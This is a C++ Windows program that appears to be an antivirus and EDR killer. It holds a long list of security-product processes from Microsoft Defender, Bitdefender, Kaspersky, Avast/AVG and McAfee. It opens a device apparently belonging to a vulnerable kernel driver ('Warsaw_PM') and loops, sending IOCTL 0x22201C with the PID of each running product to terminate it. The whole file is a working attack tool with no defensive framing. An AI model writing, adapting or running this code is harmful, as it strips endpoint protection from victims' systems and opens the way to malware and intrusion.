#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <locale>
#include <codecvt>
#include <atomic>
#include <iostream>
#include <cstdint>

const std::vector<std::wstring> TARGET_PROCESSES = {
    // Microsoft Defender
        L"MsMpEng.exe",
        L"MsMpEngCP.exe",
        L"MpCmdRun.exe",
        L"NisSrv.exe",
        L"SecurityHealthService.exe",
        L"SecurityHealthHost.exe",
        L"SecurityHealthSystray.exe",
        L"MsSense.exe",
        L"MsSecFw.exe",
        L"MsMpSigUpdate.exe",
        L"MsMpGfx.exe",
        L"MpDwnLd.exe",
        L"MpSigStub.exe",
        L"MsMpCom.exe",
        L"MSASCui.exe",
        L"WindowsDefender.exe",
        L"WdNisSvc.exe",
        L"WinDefend.exe",
        L"smartscreen.exe",

        // Bitdefender
        L"vsserv.exe",
        L"bdservicehost.exe",
        L"bdagent.exe",
        L"bdwtxag.exe",
        L"updatesrv.exe",
        L"bdredline.exe",
        L"bdscan.exe",
        L"seccenter.exe",
        L"bdsubwiz.exe",
        L"bdmcon.exe",
        L"bdtws.exe",
        L"bdntwrk.exe",
        L"bdfwfpf.exe",
        L"bdrepair.exe",
        L"bdwtxcfg.exe",
        L"bdamsi.exe",
        L"bdscriptm.exe",
        L"bdfw.exe",
        L"bdsandbox.exe",
        L"bdenterpriseagent.exe",
        L"bdappspider.exe",

        // Kaspersky
        L"avp.exe",
        L"avpui.exe",
        L"klnagent.exe",
        L"klnsacsvc.exe",
        L"klnfw.exe",
        L"kavfs.exe",
        L"kavfsslp.exe",
        L"kavfsgt.exe",
        L"kmon.exe",
        L"ksde.exe",
        L"ksdeui.exe",
        L"kavtray.exe",
        L"kpf4ss.exe",
        L"kpm.exe",
        L"ksc.exe",
        L"klnupdate.exe",

        // Avast/AVG
        L"AvastSvc.exe",
        L"AvastUI.exe",
        L"AvastBrowserSecurity.exe",
        L"aswEngSrv.exe",
        L"aswToolsSvc.exe",
        L"aswidsagent.exe",
        L"avg.exe",
        L"avgui.exe",
        L"avgnt.exe",
        L"avgsvc.exe",
        L"avgidsagent.exe",
        L"avgemc.exe",
        L"avgmfapx.exe",
        L"avgsvca.exe",
        L"avgwdsvc.exe",
        L"avgupsvc.exe",

        // McAfee
        L"McAfeeService.exe",
        L"McAPExe.exe",
        L"mcshield.exe",
        L"mfemms.exe",
        L"mfeann.exe",
        L"mfefire.exe",
        L"mfemactl.exe",
        L"mfehcs.exe",
        L"mfemmseng.exe",
        L"mfevtps.exe",
        L"mcagent.exe",
        L"mctray.exe",
        L"mcuicnt.exe",
        L"mcmscsvc.exe",
        L"mcnasvc.exe",
        L"mcpromgr.exe",
        L"mcods.exe",
        L"mctask.exe",
        L"mcsacore.exe",
        L"mcscript.exe",
        L"mfeffcoreservice.exe",
        L"mfetp.exe",
        L"mfevtp.exe"
};

DWORD FindProcessIdByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[!] Failed to create process snapshot" << std::endl;
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        std::wcerr << L"[!] Failed to get first process" << std::endl;
        return 0;
    }

    do {
        std::wstring currentProcess(pe32.szExeFile);
        if (_wcsicmp(currentProcess.c_str(), processName.c_str()) == 0) {
            DWORD pid = pe32.th32ProcessID;
            CloseHandle(hSnapshot);
            return pid;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

class DriverController {
private:
    HANDLE m_hDriver;
    std::atomic<bool> m_running;

public:
    DriverController() : m_hDriver(INVALID_HANDLE_VALUE), m_running(true) {}

    bool Initialize() {
        std::wstring deviceName = LR"(\\.\Warsaw_PM)";

        m_hDriver = CreateFileW(
            deviceName.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr
        );

        if (m_hDriver == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[!] Failed to initialize driver! Error: "
                << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Driver initialized successfully!" << std::endl;
        std::wcout << L"[+] Driver handle: " << m_hDriver << std::endl;
        return true;
    }

    bool SendIoctl(DWORD pid) {
        std::vector<uint8_t> buffer(1036, 0);

        // Записываем PID в первые 4 байта
        memcpy(buffer.data(), &pid, sizeof(pid));

        DWORD bytesReturned = 0;

        BOOL result = DeviceIoControl(
            m_hDriver,
            0x22201C,
            buffer.data(),
            static_cast<DWORD>(buffer.size()),
            nullptr,
            0,
            &bytesReturned,
            nullptr
        );

        if (!result) {
            DWORD error = GetLastError();
            std::wcout << L"[!] DeviceIoControl failed! Error: 0x"
                << std::hex << error << std::dec << std::endl;
            return false;
        }

        std::wcout << L"[+] IOCTL 0x22201C sent for PID: " << pid << std::endl;
        return true;
    }

    void Cleanup() {
        if (m_hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(m_hDriver);
            m_hDriver = INVALID_HANDLE_VALUE;
            std::wcout << L"[*] Driver handle closed!" << std::endl;
        }
    }

    bool IsRunning() const { return m_running.load(); }
    void Stop() { m_running.store(false); }

    ~DriverController() {
        Cleanup();
    }
};

BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        std::wcout << L"[!] Shutting down..." << std::endl;
        return TRUE;
    }
    return FALSE;
}

int main() {
    // Настройка обработчика Ctrl+C
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        std::wcerr << L"[!] Failed to set console control handler" << std::endl;
        return 1;
    }

    DriverController driver;

    if (!driver.Initialize()) {
        return 1;
    }

    std::wcout << L"[*] Scanning for target processes..." << std::endl;
    std::wcout << L"[*] Press CTRL+C to stop..." << std::endl;

    while (driver.IsRunning()) {
        for (const auto& processName : TARGET_PROCESSES) {
            DWORD pid = FindProcessIdByName(processName);
            if (pid != 0) {
                std::wcout << L"  -- Found " << processName
                    << L" - PID: " << pid << std::endl;
                std::wcout << L"[*] Killing " << processName << L"..." << std::endl;

                if (!driver.SendIoctl(pid)) {
                    std::wcerr << L"[!] Failed to send IOCTL for PID: "
                        << pid << std::endl;
                }
            }
        }

        // Небольшая пауза для предотвращения высокого потребления CPU
        Sleep(100);
    }

    std::wcout << L"[*] Cleaning up..." << std::endl;
    driver.Cleanup();

    return 0;
}
